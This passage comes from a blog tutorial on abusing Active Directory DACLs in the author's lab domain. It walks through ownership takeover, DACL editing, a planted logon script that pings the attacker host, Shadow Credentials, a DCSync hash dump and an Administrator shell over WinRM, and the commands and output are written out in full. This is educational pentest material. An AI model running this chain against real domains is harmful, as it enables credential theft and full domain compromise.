<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">owneredit</span><span class="o">.</span><span class="n">py</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="o">/</span><span class="n">ellie</span><span class="p">:</span><span class="s1">'@williams2'</span> <span class="o">-</span><span class="n">new</span><span class="o">-</span><span class="n">owner</span> <span class="n">ellie</span> <span class="o">-</span><span class="n">target</span> <span class="n">elswix</span> <span class="o">-</span><span class="n">action</span> <span class="n">write</span>
<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.12.0</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="n">Fortra</span><span class="p">,</span> <span class="n">LLC</span> <span class="n">and</span> <span class="n">its</span> <span class="n">affiliated</span> <span class="n">companies</span> 

<span class="p" style="color: #2489a5">[*]</span> <span class="n">Current</span> <span class="n">owner</span> <span class="n">information</span> <span class="n">below</span>
<span class="p" style="color: #2489a5">[*]</span> <span class="o">-</span> <span class="n">SID</span><span class="p">:</span> <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">913553514</span><span class="o">-</span><span class="mi">3139970507</span><span class="o">-</span><span class="mi">907487564</span><span class="o">-</span><span class="mi">512</span>
<span class="p" style="color: #2489a5">[*]</span> <span class="o">-</span> <span class="n">sAMAccountName</span><span class="p">:</span> <span class="n">Domain</span> <span class="n">Admins</span>
<span class="p" style="color: #2489a5">[*]</span> <span class="o">-</span> <span class="n">distinguishedName</span><span class="p">:</span> <span class="n">CN</span><span class="o">=</span><span class="n">Domain</span> <span class="n">Admins</span><span class="p">,</span><span class="n">CN</span><span class="o">=</span><span class="n">Users</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">elswixcorp</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">local</span>
<span class="p" style="color: #2489a5">[*]</span> <span class="n">OwnerSid</span> <span class="n">modified</span> <span class="n">successfully</span><span class="n">!</span>
</pre></div>
<p>As observed, the script reported that the previous owner of <strong>elswix</strong> was the <strong>Domain Admins</strong> group and then modified the ownership. If we run the script again, this time specifying <code>read</code> for the <code>-action</code> parameter, we should now see that <strong>ellie</strong> owns <strong>elswix</strong>.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">owneredit</span><span class="o">.</span><span class="n">py</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="o">/</span><span class="n">ellie</span><span class="p">:</span><span class="s1">'@williams2'</span> <span class="o">-</span><span class="n">target</span> <span class="n">elswix</span> <span class="o">-</span><span class="n">action</span> <span class="n">read</span>
<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.12.0</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="n">Fortra</span><span class="p">,</span> <span class="n">LLC</span> <span class="n">and</span> <span class="n">its</span> <span class="n">affiliated</span> <span class="n">companies</span> 

<span class="p" style="color: #2489a5">[*]</span> <span class="n">Current</span> <span class="n">owner</span> <span class="n">information</span> <span class="n">below</span>
<span class="p" style="color: #2489a5">[*]</span> <span class="o">-</span> <span class="n">SID</span><span class="p">:</span> <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">913553514</span><span class="o">-</span><span class="mi">3139970507</span><span class="o">-</span><span class="mi">907487564</span><span class="o">-</span><span class="mi">1112</span>
<span class="p" style="color: #2489a5">[*]</span> <span class="o">-</span> <span class="n">sAMAccountName</span><span class="p">:</span> <span class="n">ellie</span>
<span class="p" style="color: #2489a5">[*]</span> <span class="o">-</span> <span class="n">distinguishedName</span><span class="p">:</span> <span class="n">CN</span><span class="o">=</span><span class="n">ellie</span><span class="p">,</span><span class="n">CN</span><span class="o">=</span><span class="n">Users</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">elswixcorp</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">local</span>
</pre></div>
<p>And yes, the ownership of <strong>elswix</strong> was successfully transferred to <strong>ellie</strong>.</p><br/>
<p>Now, <strong>ellie</strong>, as the owner of <strong>elswix</strong>, can modify its permissions (DACL). This means we can grant ourselves <code>GenericAll</code> over <strong>elswix</strong>. To achieve this, I'll use <code>dacledit.py</code>:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">dacledit</span><span class="o">.</span><span class="n">py</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="o">/</span><span class="n">ellie</span><span class="p">:</span><span class="s1">'@williams2'</span> <span class="o">-</span><span class="n">principal</span> <span class="n">ellie</span> <span class="o">-</span><span class="n">target</span> <span class="n">elswix</span> <span class="o">-</span><span class="n">action</span> <span class="n">write</span> <span class="o">-</span><span class="n">rights</span> <span class="n">FullControl</span>
<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.12.0</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="n">Fortra</span><span class="p">,</span> <span class="n">LLC</span> <span class="n">and</span> <span class="n">its</span> <span class="n">affiliated</span> <span class="n">companies</span> 

<span class="p" style="color: #2489a5">[*]</span> <span class="n">DACL</span> <span class="n">backed</span> <span class="n">up</span> <span class="n">to</span> <span class="n">dacledit</span><span class="o">-</span><span class="mi">20250221</span><span class="o">-</span><span class="mf">151351.</span><span class="n">bak</span>
<span class="p" style="color: #2489a5">[*]</span> <span class="n">DACL</span> <span class="n">modified</span> <span class="n">successfully</span><span class="n">!</span>
</pre></div>
<p>It worked! Now, with <code>GenericAll</code> privileges, we can modify many of <strong>elswix</strong>'s attributes. To gain access as <strong>elswix</strong>, we could simply abuse <strong>Shadow Credentials</strong> again. However, I'll demonstrate an alternative method by modifying the <code>scriptPath</code> attribute.</p><br/>
<h3>Logon Scripts and the <code>scriptPath</code> Attribute</h3><br/>
<p>Logon scripts are scripts executed automatically when a user logs into a system. These scripts are typically used for configuring the environment, mapping network drives, updating software, or enforcing security policies.</p><br/>
<p>The <code>scriptPath</code> attribute in Active Directory specifies the path to a logon script that will be executed upon user login. These scripts are usually stored in the <strong>NETLOGON</strong> share (<code>\\domain_controller\NETLOGON</code>), which is replicated across all domain controllers.</p><br/>
<h3>Limitations of Using <code>scriptPath</code> for Exploitation</h3><br/>
<p>While modifying the <code>scriptPath</code> attribute can be used for privilege escalation (by setting it to a malicious script), this method has several drawbacks:</p><br/>
<ul>
<li><strong>User Interaction Required</strong> – The user must log in for the script to execute.</li>
<li><strong>Execution Restrictions</strong> – Security policies such as execution prevention and GPO restrictions may block the script.</li>
<li><strong>Visibility</strong> – Admins can easily detect and remove unauthorized scripts from NETLOGON.</li>
</ul>
<p>Additionally, you need <strong>write privileges</strong> on the <code>NETLOGON</code> share; otherwise, this technique won't work, as you cannot specify an external directory. You may have seen in some <strong>CTFs</strong> that it's possible to specify a remote share to host the file. However, this works because a scheduled task runs a script that reads the <code>scriptPath</code> value and executes it, effectively simulating a logon. This setup is uncommon in real-world environments.</p><br/>
<p>In this case, for the technique to work, <code>ellie</code> must have <strong>write privileges</strong> on <code>NETLOGON</code>. To demonstrate the exploitation process, I have assigned these privileges accordingly.</p><br/>
<p>First, let's create a logon script. This can be a simple <code>.bat</code> file containing any command we want to execute. For example, I want <code>elswix</code> to ping my attacker host every time it logs in:</p><br/>
<div class="highlight"><pre><span></span><span class="n">ping</span> <span class="mf">192.168.100.1</span>
</pre></div>
<p>I named this file <code>malicious.bat</code>. Now, let's upload it to the <code>NETLOGON</code> share. Interestingly, connecting directly to <code>NETLOGON</code> does not allow me to write files there. However, you can achieve the same result by accessing the <code>SYSVOL</code> share and navigating to the <code>scripts</code> folder within <code>elswixcorp.local</code>: </p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">smbclient</span> <span class="s1">'//dc01/SYSVOL'</span> <span class="o">-</span><span class="n">U</span> <span class="n">ELSWIXCORP</span>\\<span class="n">ellie</span> <span class="o">-</span><span class="n">c</span> <span class="s2">"put malicious.bat elswixcorp.local/scripts/malicious.bat"</span>
<span class="n">Password</span> <span class="n">for</span> <span class="p">[</span><span class="n">ELSWIXCORP</span>\<span class="n">ellie</span><span class="p">]:</span>
<span class="n">putting</span> <span class="n">file</span> <span class="n">malicious</span><span class="o">.</span><span class="n">bat</span> <span class="n">as</span> \<span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>\<span class="n">scripts</span>\<span class="n">malicious</span><span class="o">.</span><span class="n">bat</span> <span class="p">(</span><span class="mf">6.2</span> <span class="n">kb</span><span class="o">/</span><span class="n">s</span><span class="p">)</span> <span class="p">(</span><span class="n">average</span> <span class="mf">6.2</span> <span class="n">kb</span><span class="o">/</span><span class="n">s</span><span class="p">)</span>
</pre></div>
<p>Once the logon script is uploaded, I'll use <code>bloodyAD</code> to modify the <code>scriptPath</code> attribute of <code>elswix</code>:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">bloodyAD</span> <span class="o">--</span><span class="n">host</span> <span class="mf">192.168.100.3</span> <span class="o">-</span><span class="n">u</span> <span class="n">ellie</span> <span class="o">-</span><span class="n">p</span> <span class="n">@williams2</span> <span class="nb">set</span> <span class="nb">object</span> <span class="n">elswix</span> <span class="n">scriptPath</span> <span class="o">-</span><span class="n">v</span> <span class="s1">'malicious.bat'</span>
<span class="p" style="color: #2d9e34">[+]</span> <span class="n">elswix</span><span class="n">'s scriptPath has been updated</span>
</pre></div>
<p>There's no need to specify the full path to <code>SYSVOL</code> or <code>NETLOGON</code> since the system automatically looks for the script within that directory.</p><br/>
<p>To verify whether the script executes upon user login, I'll use <code>tcpdump</code> to capture <code>ICMP</code> packets and check if a ping to my host is triggered:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">sudo</span> <span class="n">tcpdump</span> <span class="o">-</span><span class="n">i</span> <span class="n">enp0s8</span> <span class="n">icmp</span> <span class="o">-</span><span class="n">n</span>
<span class="p">[</span><span class="n">sudo</span><span class="p">]</span> <span class="n">password</span> <span class="n">for</span> <span class="n">elswix</span><span class="p">:</span>
<span class="n">tcpdump</span><span class="p">:</span> <span class="n">verbose</span> <span class="n">output</span> <span class="n">suppressed</span><span class="p">,</span> <span class="n">use</span> <span class="o">-</span><span class="n">v</span><span class="p">[</span><span class="n">v</span><span class="p">]</span><span class="o">...</span> <span class="n">for</span> <span class="n">full</span> <span class="n">protocol</span> <span class="n">decode</span>
<span class="n">listening</span> <span class="n">on</span> <span class="n">enp0s8</span><span class="p">,</span> <span class="n">link</span><span class="o">-</span><span class="nb">type</span> <span class="n">EN10MB</span> <span class="p">(</span><span class="n">Ethernet</span><span class="p">),</span> <span class="n">snapshot</span> <span class="n">length</span> <span class="mi">262144</span> <span class="nb">bytes</span>
</pre></div>
<p>Now, I'll log in as <code>elswix</code> on a workstation. In a real scenario, this process wouldn’t be controlled by the attacker, but for demonstration purposes, I’ll do it manually.</p><br/>
<p>Finally, I received the ping, confirming that the script was successfully executed when <code>elswix</code> logged in.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">sudo</span> <span class="n">tcpdump</span> <span class="o">-</span><span class="n">i</span> <span class="n">enp0s8</span> <span class="n">icmp</span> <span class="o">-</span><span class="n">n</span>
<span class="p">[</span><span class="n">sudo</span><span class="p">]</span> <span class="n">password</span> <span class="n">for</span> <span class="n">elswix</span><span class="p">:</span>
<span class="n">tcpdump</span><span class="p">:</span> <span class="n">verbose</span> <span class="n">output</span> <span class="n">suppressed</span><span class="p">,</span> <span class="n">use</span> <span class="o">-</span><span class="n">v</span><span class="p">[</span><span class="n">v</span><span class="p">]</span><span class="o">...</span> <span class="n">for</span> <span class="n">full</span> <span class="n">protocol</span> <span class="n">decode</span>
<span class="n">listening</span> <span class="n">on</span> <span class="n">enp0s8</span><span class="p">,</span> <span class="n">link</span><span class="o">-</span><span class="nb">type</span> <span class="n">EN10MB</span> <span class="p">(</span><span class="n">Ethernet</span><span class="p">),</span> <span class="n">snapshot</span> <span class="n">length</span> <span class="mi">262144</span> <span class="nb">bytes</span>
<span class="mi">15</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mf">20.211930</span> <span class="n">IP</span> <span class="mf">192.168.100.4</span> <span class="o">&gt;</span> <span class="mf">192.168.100.1</span><span class="p">:</span> <span class="n">ICMP</span> <span class="n">echo</span> <span class="n">request</span><span class="p">,</span> <span class="nb">id</span> <span class="mi">1</span><span class="p">,</span> <span class="n">seq</span> <span class="mi">1</span><span class="p">,</span> <span class="n">length</span> <span class="mi">40</span>
<span class="mi">15</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mf">20.212040</span> <span class="n">IP</span> <span class="mf">192.168.100.1</span> <span class="o">&gt;</span> <span class="mf">192.168.100.4</span><span class="p">:</span> <span class="n">ICMP</span> <span class="n">echo</span> <span class="n">reply</span><span class="p">,</span> <span class="nb">id</span> <span class="mi">1</span><span class="p">,</span> <span class="n">seq</span> <span class="mi">1</span><span class="p">,</span> <span class="n">length</span> <span class="mi">40</span>
<span class="mi">15</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mf">21.218561</span> <span class="n">IP</span> <span class="mf">192.168.100.4</span> <span class="o">&gt;</span> <span class="mf">192.168.100.1</span><span class="p">:</span> <span class="n">ICMP</span> <span class="n">echo</span> <span class="n">request</span><span class="p">,</span> <span class="nb">id</span> <span class="mi">1</span><span class="p">,</span> <span class="n">seq</span> <span class="mi">2</span><span class="p">,</span> <span class="n">length</span> <span class="mi">40</span>
<span class="mi">15</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mf">21.218579</span> <span class="n">IP</span> <span class="mf">192.168.100.1</span> <span class="o">&gt;</span> <span class="mf">192.168.100.4</span><span class="p">:</span> <span class="n">ICMP</span> <span class="n">echo</span> <span class="n">reply</span><span class="p">,</span> <span class="nb">id</span> <span class="mi">1</span><span class="p">,</span> <span class="n">seq</span> <span class="mi">2</span><span class="p">,</span> <span class="n">length</span> <span class="mi">40</span>
<span class="mi">15</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mf">22.233123</span> <span class="n">IP</span> <span class="mf">192.168.100.4</span> <span class="o">&gt;</span> <span class="mf">192.168.100.1</span><span class="p">:</span> <span class="n">ICMP</span> <span class="n">echo</span> <span class="n">request</span><span class="p">,</span> <span class="nb">id</span> <span class="mi">1</span><span class="p">,</span> <span class="n">seq</span> <span class="mi">3</span><span class="p">,</span> <span class="n">length</span> <span class="mi">40</span>
<span class="mi">15</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mf">22.233143</span> <span class="n">IP</span> <span class="mf">192.168.100.1</span> <span class="o">&gt;</span> <span class="mf">192.168.100.4</span><span class="p">:</span> <span class="n">ICMP</span> <span class="n">echo</span> <span class="n">reply</span><span class="p">,</span> <span class="nb">id</span> <span class="mi">1</span><span class="p">,</span> <span class="n">seq</span> <span class="mi">3</span><span class="p">,</span> <span class="n">length</span> <span class="mi">40</span>
<span class="mi">15</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mf">23.264886</span> <span class="n">IP</span> <span class="mf">192.168.100.4</span> <span class="o">&gt;</span> <span class="mf">192.168.100.1</span><span class="p">:</span> <span class="n">ICMP</span> <span class="n">echo</span> <span class="n">request</span><span class="p">,</span> <span class="nb">id</span> <span class="mi">1</span><span class="p">,</span> <span class="n">seq</span> <span class="mi">4</span><span class="p">,</span> <span class="n">length</span> <span class="mi">40</span>
<span class="mi">15</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mf">23.264906</span> <span class="n">IP</span> <span class="mf">192.168.100.1</span> <span class="o">&gt;</span> <span class="mf">192.168.100.4</span><span class="p">:</span> <span class="n">ICMP</span> <span class="n">echo</span> <span class="n">reply</span><span class="p">,</span> <span class="nb">id</span> <span class="mi">1</span><span class="p">,</span> <span class="n">seq</span> <span class="mi">4</span><span class="p">,</span> <span class="n">length</span> <span class="mi">40</span>
</pre></div>
<p>Now, we could simply create a reverse shell payload to gain access to the system. However, I won’t take this approach, as I want to demonstrate how to abuse ACLs remotely. That said, you’re free to try it yourself.</p><br/>
<p>Even though we have achieved command execution on the system, we still lack valid credentials. To obtain them, I'll exploit <strong>Shadow Credentials</strong> once again to recover the NT hash.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">certipy</span> <span class="n">shadow</span> <span class="n">auto</span> <span class="o">-</span><span class="n">username</span> <span class="n">ellie</span><span class="n">@elswixcorp</span><span class="o">.</span><span class="n">local</span> <span class="o">-</span><span class="n">password</span> <span class="s1">'@williams2'</span> <span class="o">-</span><span class="n">account</span> <span class="n">elswix</span> <span class="o">-</span><span class="n">target</span> <span class="mf">192.168.100.3</span>
<span class="n">Certipy</span> <span class="n">v4</span><span class="mf">.8.2</span> <span class="o">-</span> <span class="n">by</span> <span class="n">Oliver</span> <span class="n">Lyak</span> <span class="p">(</span><span class="n">ly4k</span><span class="p">)</span>

<span class="p" style="color: #2489a5">[*]</span> <span class="n">Targeting</span> <span class="n">user</span> <span class="s1">'elswix'</span>
<span class="p" style="color: #2489a5">[*]</span> <span class="n">Generating</span> <span class="n">certificate</span>
<span class="p" style="color: #2489a5">[*]</span> <span class="n">Certificate</span> <span class="n">generated</span>
<span class="p" style="color: #2489a5">[*]</span> <span class="n">Generating</span> <span class="n">Key</span> <span class="n">Credential</span>
<span class="p" style="color: #2489a5">[*]</span> <span class="n">Key</span> <span class="n">Credential</span> <span class="n">generated</span> <span class="n">with</span> <span class="n">DeviceID</span> <span class="s1">'46d1f389-b563-d3e0-a082-6a209e054f9b'</span>
<span class="p" style="color: #2489a5">[*]</span> <span class="n">Adding</span> <span class="n">Key</span> <span class="n">Credential</span> <span class="n">with</span> <span class="n">device</span> <span class="n">ID</span> <span class="s1">'46d1f389-b563-d3e0-a082-6a209e054f9b'</span> <span class="n">to</span> <span class="n">the</span> <span class="n">Key</span> <span class="n">Credentials</span> <span class="n">for</span> <span class="s1">'elswix'</span>
<span class="p" style="color: #2489a5">[*]</span> <span class="n">Successfully</span> <span class="n">added</span> <span class="n">Key</span> <span class="n">Credential</span> <span class="n">with</span> <span class="n">device</span> <span class="n">ID</span> <span class="s1">'46d1f389-b563-d3e0-a082-6a209e054f9b'</span> <span class="n">to</span> <span class="n">the</span> <span class="n">Key</span> <span class="n">Credentials</span> <span class="n">for</span> <span class="s1">'elswix'</span>
<span class="p" style="color: #2489a5">[*]</span> <span class="n">Authenticating</span> <span class="n">as</span> <span class="s1">'elswix'</span> <span class="n">with</span> <span class="n">the</span> <span class="n">certificate</span>
<span class="p" style="color: #2489a5">[*]</span> <span class="n">Using</span> <span class="n">principal</span><span class="p">:</span> <span class="n">elswix</span><span class="n">@elswixcorp</span><span class="o">.</span><span class="n">local</span>
<span class="p" style="color: #2489a5">[*]</span> <span class="n">Trying</span> <span class="n">to</span> <span class="n">get</span> <span class="n">TGT</span><span class="o">...</span>
<span class="p" style="color: #2489a5">[*]</span> <span class="n">Got</span> <span class="n">TGT</span>
<span class="p" style="color: #2489a5">[*]</span> <span class="n">Saved</span> <span class="n">credential</span> <span class="n">cache</span> <span class="n">to</span> <span class="s1">'elswix.ccache'</span>
<span class="p" style="color: #2489a5">[*]</span> <span class="n">Trying</span> <span class="n">to</span> <span class="n">retrieve</span> <span class="n">NT</span> <span class="nb">hash</span> <span class="n">for</span> <span class="s1">'elswix'</span>
<span class="p" style="color: #2489a5">[*]</span> <span class="n">Restoring</span> <span class="n">the</span> <span class="n">old</span> <span class="n">Key</span> <span class="n">Credentials</span> <span class="n">for</span> <span class="s1">'elswix'</span>
<span class="p" style="color: #2489a5">[*]</span> <span class="n">Successfully</span> <span class="n">restored</span> <span class="n">the</span> <span class="n">old</span> <span class="n">Key</span> <span class="n">Credentials</span> <span class="n">for</span> <span class="s1">'elswix'</span>
<span class="p" style="color: #2489a5">[*]</span> <span class="n">NT</span> <span class="nb">hash</span> <span class="n">for</span> <span class="s1">'elswix'</span><span class="p">:</span> <span class="mi">07</span><span class="n">d128430a6338f8d537f6b3ae1dc136</span>
</pre></div>
<p>Now, we can use this NT hash to authenticate as <code>elswix</code>.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">nxc</span> <span class="n">smb</span> <span class="mf">192.168.100.3</span> <span class="o">-</span><span class="n">u</span> <span class="n">elswix</span> <span class="o">-</span><span class="n">H</span> <span class="mi">07</span><span class="n">d128430a6338f8d537f6b3ae1dc136</span>
<span class="p">SMB</span>         <span class="mf">192.168.100.3</span>   <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p" style="color: #2489a5">[*]</span> <span class="n">Windows</span> <span class="n">Server</span> <span class="mi">2022</span> <span class="n">Build</span> <span class="mi">20348</span> <span class="n">x64</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">DC01</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="p">:</span><span class="kc">True</span><span class="p">)</span> <span class="p">(</span><span class="n">SMBv1</span><span class="p">:</span><span class="kc">False</span><span class="p">)</span>
<span class="p">SMB</span>         <span class="mf">192.168.100.3</span>   <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p" style="color: #2d9e34">[+]</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>\<span class="n">elswix</span><span class="p">:</span><span class="mi">07</span><span class="n">d128430a6338f8d537f6b3ae1dc136</span>
</pre></div>
<h3>AllExtendedRights on DC</h3><br/>
<p>As <code>elswix</code>, we have <code>AllExtendedRights</code> privileges over the Domain Controller (DC). This allows us to perform a <code>DCSync</code> attack, enabling us to request and extract all credentials from the domain database. With these credentials, we can ultimately gain access as the Administrator.</p><br/>
<p>To execute this attack, we can use <code>secretsdump.py</code> from the Impacket suite. Simply provide the credentials of the user with <code>DCSync</code> privileges—in this case, <code>elswix</code>.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">secretsdump</span><span class="o">.</span><span class="n">py</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="o">/</span><span class="n">elswix</span><span class="o">@</span><span class="mf">192.168.100.3</span> <span class="o">-</span><span class="n">hashes</span> <span class="p">:</span><span class="mi">07</span><span class="n">d128430a6338f8d537f6b3ae1dc136</span>
<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.12.0</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="n">Fortra</span><span class="p">,</span> <span class="n">LLC</span> <span class="n">and</span> <span class="n">its</span> <span class="n">affiliated</span> <span class="n">companies</span> 

<span class="p" style="color: #b83c3c">[-]</span> <span class="n">RemoteOperations</span> <span class="n">failed</span><span class="p">:</span> <span class="n">DCERPC</span> <span class="n">Runtime</span> <span class="n">Error</span><span class="p">:</span> <span class="n">code</span><span class="p">:</span> <span class="mh">0x5</span> <span class="o">-</span> <span class="n">rpc_s_access_denied</span> 
<span class="p" style="color: #2489a5">[*]</span> <span class="n">Dumping</span> <span class="n">Domain</span> <span class="n">Credentials</span> <span class="p">(</span><span class="n">domain</span>\<span class="n">uid</span><span class="p">:</span><span class="n">rid</span><span class="p">:</span><span class="n">lmhash</span><span class="p">:</span><span class="n">nthash</span><span class="p">)</span>
<span class="p" style="color: #2489a5">[*]</span> <span class="n">Using</span> <span class="n">the</span> <span class="n">DRSUAPI</span> <span class="n">method</span> <span class="n">to</span> <span class="n">get</span> <span class="n">NTDS</span><span class="o">.</span><span class="n">DIT</span> <span class="n">secrets</span>
<span class="n">Administrator</span><span class="p">:</span><span class="mi">500</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">58</span><span class="n">a478135a93ac3bf058a5ea0e8fdb71</span><span class="p">:::</span>
<span class="n">Guest</span><span class="p">:</span><span class="mi">501</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">31</span><span class="n">d6cfe0d16ae931b73c59d7e0c089c0</span><span class="p">:::</span>
<span class="n">krbtgt</span><span class="p">:</span><span class="mi">502</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">31</span><span class="n">b9194cc900c70446cf5c771689b951</span><span class="p">:::</span>
<span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>\<span class="n">karl</span><span class="p">:</span><span class="mi">1103</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">2</span><span class="n">b576acbe6bcfda7294d6bd18041b8fe</span><span class="p">:::</span>
<span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>\<span class="n">elswix</span><span class="p">:</span><span class="mi">1107</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">07</span><span class="n">d128430a6338f8d537f6b3ae1dc136</span><span class="p">:::</span>
<span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>\<span class="n">claire</span><span class="p">:</span><span class="mi">1111</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">40</span><span class="n">fac013f33b053e878ca653ccd60033</span><span class="p">:::</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
<span class="p" style="color: #2489a5">[*]</span> <span class="n">Cleaning</span> <span class="n">up</span><span class="o">...</span>
</pre></div>
<p>As observed, the output is quite extensive. However, the key takeaway is that we successfully retrieved the <code>Administrator</code>'s NT hash.</p><br/>
<p>Now, with this credential, we can gain access to the system using various techniques, such as <code>psexec</code>. In this case, I'll leverage <code>WinRM</code>, which is exposed, allowing us to authenticate as <code>Administrator</code> and gain remote access.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">evil</span><span class="o">-</span><span class="n">winrm</span> <span class="o">-</span><span class="n">i</span> <span class="mf">192.168.100.3</span> <span class="o">-</span><span class="n">u</span> <span class="n">administrator</span> <span class="o">-</span><span class="n">H</span> <span class="mi">58</span><span class="n">a478135a93ac3bf058a5ea0e8fdb71</span>

<span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span> <span class="n">shell</span> <span class="n">v3</span><span class="mf">.7</span>

<span class="n">Info</span><span class="p">:</span> <span class="n">Establishing</span> <span class="n">connection</span> <span class="n">to</span> <span class="n">remote</span> <span class="n">endpoint</span>
<span class="evrm">*Evil-WinRM* PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span>\<span class="n">Documents</span><span class="o">&gt;</span> <span class="n">whoami</span>
<span class="n">elswixcorp</span>\<span class="n">administrator</span>
<span class="evrm">*Evil-WinRM* PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span>\<span class="n">Documents</span><span class="o">&gt;</span>
</pre></div>
<p>You could also leverage the <code>krbtgt</code> account keys to craft a <strong>Golden Ticket</strong>, granting persistent access to the domain. I’ve already covered this technique in previous articles, but it’s another powerful way to maintain control over the environment.</p><br/>
<h3>Conclusion</h3><br/>
<p>In this article, we explored how insecure <strong>Discretionary Access Control Lists (DACLs)</strong> can be leveraged to escalate privileges within an Active Directory environment. Starting from a low-privileged account, we systematically abused misconfigured permissions—such as <code>WriteSPN</code>, <code>WriteOwner</code>, and <code>GenericAll</code>—to manipulate accounts, retrieve credentials, and ultimately compromise the <strong>Domain Controller</strong>.</p><br/>
<p>I highly recommend reading my previous articles if you haven’t done so already. These articles cover important concepts that will help enrich your understanding of this one. Additionally, I explore other fascinating techniques that you might find useful.</p><br/>
<p>In upcoming articles, we'll be discussing other exploitation scenarios related to misconfigurated ACLs and introduce some new interesting active directory topics. </p><br/>
<p>Happy Hacking!</p><br/>
<p><strong>Joaquín (AKA elswix)</strong></p><br/>
<h3>References</h3><br/>
<p><a href="https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse/index.html">https://www.thehacker.recipes/ad/movement/dacl/</a>
<br/>
<a href="https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse/index.html">https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse/index.html</a>
<br/>
<a href="https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html">https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html</a>
<br/>
<a href="https://support.bloodhoundenterprise.io/hc/en-us/articles/17312606850203-GenericWrite">https://support.bloodhoundenterprise.io/hc/en-us/articles/17312606850203-GenericWrite</a></p><br/>
                        </div>
                    </div>
                </section>

            </main>
        </div>
    </div>
    <script src="/js/sidebarToggle.js"></script>
    <script src="/js/fixMobileImages.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
